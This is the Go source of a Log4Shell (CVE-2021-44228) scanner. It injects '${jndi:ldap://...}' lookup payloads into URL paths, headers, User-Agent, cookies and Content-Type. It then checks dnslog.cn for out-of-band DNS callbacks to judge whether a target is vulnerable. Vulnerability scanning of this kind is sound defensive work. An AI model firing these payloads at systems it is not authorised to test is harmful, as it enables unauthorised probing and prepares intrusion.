package main

import (
	"bufio"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"runtime"
	"strings"
)

const GETURL = "http://dnslog.cn/getdomain.php"
const FETCHURL = "http://dnslog.cn/getrecords.php"
const HEADPATH = "patterns/headers.txt"
const USERAGENT = "patterns/user-agents.txt"
const URLPATH = "patterns/urls.txt"
const PARAMS = "patterns/cookies.txt"
const CONTENTTYPE = "patterns/content-types.txt"

func ReadHeader(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

func PayloadGetHttpUrl(url string) {
	client := http.Client{}
	req , err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("We have a error : ", err)

	}
	_, err = client.Do(req)
	if err != nil {
		fmt.Println("Please check you site is up or not : ", err)
		os.Exit(0)
	}
}

func PayloadGetHttp(url string, head string ,payload string) http.Header {
	client := http.Client{}
	req , err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("We have a error : ", err)

	}

	req.Header = http.Header{
		head: []string{payload},
	}
	_, err = client.Do(req)
	if err != nil {
		fmt.Println("Please check you site is up or not : ", err)
		os.Exit(0)
	}
	return req.Header
}

func PayloadGetHttpCookies(url string, name string ,payload string) string {
	var body []byte
	client := http.Client{}
	req , err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("We have a error : ", err)
		return ""
	}
	req.AddCookie(&http.Cookie{Name: name, Value: payload})

	res, err := client.Do(req)
	if err != nil {
		fmt.Println("We have a error : ", err)
		return ""
	}
	version := runtime.Version()
	if version >= "go1.16" {
		body, err = ioutil.ReadAll(res.Body)
	} else {
		body, err = ioutil.ReadAll(res.Body)
	}
	if err != nil {
		fmt.Println("We have a error : ", err)
		return ""
	}
	bodyStr := string(body)
	return bodyStr
}

func GetHttpWithoutSession(url string) (string, string) {
	var body []byte
	client := http.Client{}
	req , err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("We have a error : ", err)
		return "", ""
	}
	res, err := client.Do(req)
	if err != nil {
		fmt.Println("We have a error : ", err)
		return "", ""
	}
	version := runtime.Version()
	if version >= "go1.16" {
		body, err = ioutil.ReadAll(res.Body)
	} else {
		body, err = ioutil.ReadAll(res.Body)
	}

	bodyStr := string(body)
	split := strings.Split(res.Header.Get("Set-Cookie"), "=")
	session := strings.Replace(split[1], "; path", "", 1)
	return bodyStr, session
}

func GetHttp(url string, session string) string {
	var body []byte
	client := http.Client{}
	req , err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("We have a error : ", err)
		return ""
	}
	req.AddCookie(&http.Cookie{Name: "PHPSESSID", Value: session})
	res, err := client.Do(req)
	if err != nil {
		fmt.Println("We have a error : ", err)
		return ""
	}
	version := runtime.Version()
	version = "go1.15"
	if version >= "go1.16" {
		body, err = ioutil.ReadAll(res.Body)
	} else {
		body, err = ioutil.ReadAll(res.Body)
	}
	if err != nil {
		fmt.Println("We have a error : ", err)
		return ""
	}
	bodyStr := string(body)
	return bodyStr
}

func HeaderScan(domain string, session string, url string)  {
	headers, err := ReadHeader(HEADPATH)
	if err != nil {
		log.Fatalf("Error to read file : %s", err)
	}
	for i, header := range headers {

		fmt.Println("[+++] Your domain generated : " , domain)
		fmt.Println("[+++] Your session is : ", session)
		payload := fmt.Sprintf("${jndi:ldap://%s/}", domain)
		payloadReq := PayloadGetHttp(url, header ,payload)
		newPayload := fmt.Sprintf("%s:%s", header, payloadReq.Get(header))
		result := GetHttp(FETCHURL, session)
		if result == "" {
			fmt.Println("[***] Payload Header : ", newPayload)
			os.Exit(0)
		}
		if result == "[]" {
			fmt.Println("[***] Payload : ", newPayload)
			fmt.Println("[---] Isn't to vulnerability CVE-2021-44228")
			fmt.Printf("#################### %v ############################", i)
			continue
		} else {
			fmt.Println("[***] Payload : ", newPayload)
			fmt.Println("[***] DNS log result : ", result)
			fmt.Println("[***] Is Vulnerability to CVE-2021-44228 - [critical]")
			os.Exit(0)
		}
	}
}

func UrlsScan(domain string, session string, url string)  {

	urls, err := ReadHeader(URLPATH)
	if err != nil {
		log.Fatalf("Error to read file : %s", err)
	}

	for i, urlPattern := range urls {
		fmt.Println("[+++] Your domain generated : " , domain)
		fmt.Println("[+++] Your session is : ", session)
		payload := fmt.Sprintf("${jndi:ldap://%s/}", domain)
		newUrl := fmt.Sprintf("%s%s%s", url, urlPattern, payload)
		PayloadGetHttpUrl(newUrl)
		result := GetHttp(FETCHURL, session)
		if result == "" {
			fmt.Println("[***] Payload URL : ", newUrl)
			os.Exit(0)
		}
		if result == "[]" {
			fmt.Println("[***] Payload : ", newUrl)
			fmt.Println("[---] Isn't to vulnerability CVE-2021-44228")
			fmt.Printf("#################### %v ############################", i)
			continue
		} else {
			fmt.Println("[***] Payload : ", newUrl)
			fmt.Println("[***] DNS log result : ", result)
			fmt.Println("[***] Is Vulnerability to CVE-2021-44228 - [critical]")
			os.Exit(0)
		}
	}

}

func UserAgentScan(domain string, session string, url string)  {

	userAgents, err := ReadHeader(USERAGENT)
	if err != nil {
		log.Fatalf("Error to read file : %s", err)
	}
	for i, userAgent := range userAgents {

		fmt.Println("[+++] Your domain generated : " , domain)
		fmt.Println("[+++] Your session is : ", session)
		payload := fmt.Sprintf("%s${jndi:ldap://%s/}", userAgent,domain)
		payloadReq := PayloadGetHttp(url, "User-Agent" ,payload)
		newPayload := fmt.Sprintf("%s:%s", userAgent, payloadReq.Get("User-Agent"))
		result := GetHttp(FETCHURL, session)
		if result == "" {
			fmt.Println("[***] Payload : ", newPayload)
			os.Exit(0)
		}
		if result == "[]" {
			fmt.Println("[***] Payload User-Agent : ", newPayload)
			fmt.Println("[---] Isn't to vulnerability CVE-2021-44228")
			fmt.Printf("#################### %v ############################", i)
			continue
		} else {
			fmt.Println("[***] Payload : ", newPayload)
			fmt.Println("[***] DNS log result : ", result)
			fmt.Println("[***] Is Vulnerability to CVE-2021-44228 - [critical]")
			os.Exit(0)
		}
	}
}

func CookiesScan(domain string, session string, url string)  {

	params, err := ReadHeader(PARAMS)
	if err != nil {
		log.Fatalf("Error to read file : %s", err)
	}
	for i, param := range params {

		fmt.Println("[+++] Your domain generated : " , domain)
		fmt.Println("[+++] Your session is : ", session)
		payload := fmt.Sprintf("${jndi:ldap://%s/}",domain)
		PayloadGetHttpCookies(url, param, payload)
		newPayload := fmt.Sprintf("%s: %s", param, payload)
		result := GetHttp(FETCHURL, session)
		if result == "" {
			fmt.Println("[***] Payload Of cookie : ", newPayload)
			os.Exit(0)
		}
		if result == "[]" {
			fmt.Println("[***] Payload Of cookie : ", newPayload)
			fmt.Println("[---] Isn't to vulnerability CVE-2021-44228")
			fmt.Printf("#################### %v ############################", i)
			continue
		} else {
			fmt.Println("[***] Payload Of cookie : ", newPayload)
			fmt.Println("[***] DNS log result : ", result)
			fmt.Println("[***] Is Vulnerability to CVE-2021-44228 - [critical]")
			os.Exit(0)
		}
	}

}

func ContentTypeScan(domain string, session string, url string)  {
	contents, err := ReadHeader(CONTENTTYPE)
	if err != nil {
		log.Fatalf("Error to read file : %s", err)
	}
	for i, content := range contents {

		fmt.Println("[+++] Your domain generated : " , domain)
		fmt.Println("[+++] Your session is : ", session)
		payload := fmt.Sprintf("%s${jndi:ldap://%s/}",content, domain)
		PayloadGetHttp(url, "Content-Type", payload)
		newPayload := fmt.Sprintf("%s: %s", "Content-Type", payload)
		result := GetHttp(FETCHURL, session)
		if result == "" {
			fmt.Println("[***] Payload Of cookie : ", newPayload)
			os.Exit(0)
		}
		if result == "[]" {
			fmt.Println("[***] Payload Of cookie : ", newPayload)
			fmt.Println("[---] Isn't to vulnerability CVE-2021-44228")
			fmt.Printf("#################### %v ############################", i)
			continue
		} else {
			fmt.Println("[***] Payload Of cookie : ", newPayload)
			fmt.Println("[***] DNS log result : ", result)
			fmt.Println("[***] Is Vulnerability to CVE-2021-44228 - [critical]")
			os.Exit(0)
		}
	}
}

func main()  {

	url := flag.String("url", "url", "please enter you url for scan")
	mode := flag.String("mode", "[urlpath, header, useragent]", "please usage mode [urlpath, header, useragent, cookie, contents]")
	flag.Parse()
	domain, session :=  GetHttpWithoutSession(GETURL)
	if *mode == "urlpath" {
		UrlsScan(domain, session, *url)
		os.Exit(0)
	}
	if *mode == "header" {
		HeaderScan(domain, session, *url)
		os.Exit(0)
	}
	if *mode == "useragent" {
		UserAgentScan(domain, session, *url)
		os.Exit(0)
	}
	if *mode == "cookie" {
		CookiesScan(domain, session, *url)
		os.Exit(0)
	}
	if *mode == "contents" {
		ContentTypeScan(domain, session, *url)
		os.Exit(0)
	}
	fmt.Println("[HELP] Please use : go run main.go -mode=[urlpath, header, useragent, cookie, contents] -url=https://example.com/")

}
